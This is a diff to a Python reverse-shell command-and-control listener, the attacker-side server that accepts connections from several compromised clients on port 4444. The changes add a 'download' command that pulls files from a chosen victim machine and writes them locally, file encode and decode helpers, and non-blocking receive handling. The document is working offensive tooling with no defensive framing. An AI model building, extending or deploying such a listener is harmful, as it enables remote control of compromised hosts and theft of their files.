@@ -2,6 +2,7 @@ import socket
 import selectors
 import base64
 import json
+import select
 class MultiClientListener:
     def __init__(self, host="0.0.0.0", port=4444):
         self.host = host
@@ -12,6 +13,23 @@ class MultiClientListener:
         self.current_client = None  # Active client for command execution
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.format = 'utf-8'
+    
+    def read_file(self, path):
+        try:
+            with open(path, "rb") as file:
+                return base64.b16encode(file.read())
+        except FileNotFoundError:
+            return f"[-]File not found :{path}".encode(self.format)
+        except Exception as e:
+            return f"[-] File reading file:{str(e)}".encode(self.format)
+        
+    def writing_file(self,path,content):
+        try:
+            with open(path,'wb') as file:
+                file.write(base64.b64decode(content))
+            return "[+] download  successfully"
+        except Exception as e:
+            return f"{e} this occured while receiving data"
     def start_listener(self):
         """Starts the multi-client reverse shell listener."""
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -43,17 +61,19 @@ class MultiClientListener:
         """Handles global commands, allowing switching between clients."""
         if not self.current_client:
             command = input("shell>> ").strip()  # ✅ Fix: Always ask for input
-            if command.lower() == "list":
+            command = command.split(" ")
+            if command[0].lower() == "list":
                 self.list_clients()
-            elif command.lower().startswith("switch "):
-                _, client_id = command.split()
+            elif command[0].lower()=="switch":
+                client_id = command[1]
                 self.switch_client(int(client_id))
-            elif command.lower() == "help":
+            elif command[0].lower() == "help":
                 print("Those are the commands and their functions")
                 print("------------------------------------------")
                 print("CTRL + C     to Exit")
                 print("switch       switching from one client id to another")
                 print("exit         to exit form any client interpreter\n")
+                print("list         list all client connected.")
                 print("For more information on tools see the command-line reference on the github page.")
 
 
@@ -63,19 +83,26 @@ class MultiClientListener:
             command = input(f"[Client {self.current_client}] Shell> ")
             self.command_loop(command)  # Send command to the selected client
 
-            
-    def receiving_data(self,conn):
-        json_data =""
+
+    def receiving_data(self, conn):
+        json_data = ""
         while True:
             try:
-                json_data = json_data + conn.recv(1024).decode(self.format)
-                return json.loads(json_data)
+                ready, _, _ = select.select([conn], [], [], 1)  # Wait up to 1 second for data
+                if ready:
+                    json_data += conn.recv(1024).decode(self.format)
+                    return json.loads(json_data)  # Successfully received full data
+                else:
+                    return None  # No data received, return None
             except json.JSONDecodeError:
-                continue
+                continue  # Keep receiving until a full JSON message is obtained
+            except BlockingIOError:
+                continue  # Ignore and retry until data is available
             except ConnectionResetError:
                 print("[!] Client forcibly closed the connection.")
                 self.disconnect_client(conn, self.current_client)
                 return None
+
 
     def accept_client(self, server_sock):
         """Accepts a new client connection."""
@@ -101,6 +128,8 @@ class MultiClientListener:
                     print(f"\n[Client {client_id}] {data}")
                 else:
                     self.disconnect_client(conn, client_id)
+            except BlockingIOError:
+                pass
             except ConnectionResetError:
                 self.disconnect_client(conn, client_id)
 
@@ -142,6 +171,7 @@ class MultiClientListener:
 
     def command_loop(self, command):
         """Handles commands for the selected client."""
+        conn = self.client_ids.get(self.current_client)
         if command.lower() in ["exit", "quit"]:
             self.current_client = None
         elif command.lower() == "list":
@@ -149,8 +179,16 @@ class MultiClientListener:
         elif command.lower().startswith("switch "):
             _, client_id = command.split()
             self.switch_client(int(client_id))
+        elif command.lower().startswith("download"):
+            self.sending_data(command)
+            data = self.receiving_data(conn)
+            if data:
+                file_name = command.split(" ")[1]
+                self.writing_file(file_name, data)
+                print(f"[+]received file content : {file_name}")
+            else:
+                 print("No data received from client.")
         else:
-            conn = self.client_ids.get(self.current_client)
             if conn:
                 self.sending_data(command)
 
